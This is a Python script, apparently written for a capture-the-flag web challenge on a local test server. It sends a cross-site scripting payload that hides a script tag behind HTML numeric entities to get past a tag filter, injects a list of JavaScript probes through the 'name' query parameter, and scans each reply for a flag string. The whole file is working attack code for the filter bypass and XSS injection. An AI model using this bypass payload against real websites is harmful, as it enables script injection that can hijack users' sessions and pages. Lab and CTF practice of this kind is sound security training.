import requests
import re

target = "http://127.0.0.1:32889/page"

# Working bypass payload
working_payload = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;{code}&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

# Try different JavaScript approaches to find the flag
test_cases = [
    # Direct DOM access
    "document.body.innerHTML",
    "document.documentElement.outerHTML",
    "document.getElementById('flag').textContent",
    "document.querySelector('[id*=flag]').textContent",
    
    # Window properties
    "Object.keys(window).filter(k=>k.includes('flag'))",
    "Object.keys(window).filter(k=>k.includes('Flag'))",
    "Object.keys(window).filter(k=>k.includes('FLAG'))",
    
    # Global search
    "JSON.stringify(window).match(/FLAG.*?}/)",
    
    # Try common flag variable names
    "window.flag",
    "window.FLAG",
    "globalThis.flag",
    
    # Check for getProp variations
    "typeof getProp",
    "typeof window.getProp",
    "Object.keys(window).filter(k=>k.toLowerCase().includes('prop'))",
    
    # Try to get all functions
    "Object.keys(window).filter(k=>typeof window[k]==='function').join(',')",
]

print("Testing JavaScript code execution to locate flag...")
print("="*70)

for i, code in enumerate(test_cases, 1):
    payload = working_payload.format(code=code)
    
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\n[Test {i}] Code: {code[:60]}")
        print(f"Status: {response.status_code} | Length: {len(response.content)} bytes")
        
        # Check for flag
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"*** FLAG FOUND: {flags[0]} ***")
            print(f"Full response:\n{response.text}")
            
        # Check for interesting content
        elif "Failed! Try again!" in response.text:
            print("→ Executed (wrong result)")
        elif "Sorry, you can't use that tag" in response.text:
            print("✗ Blocked")
        else:
            print("? Unknown response")
            
    except Exception as e:
        print(f"✗ ERROR: {str(e)}")

print("\n" + "="*70)

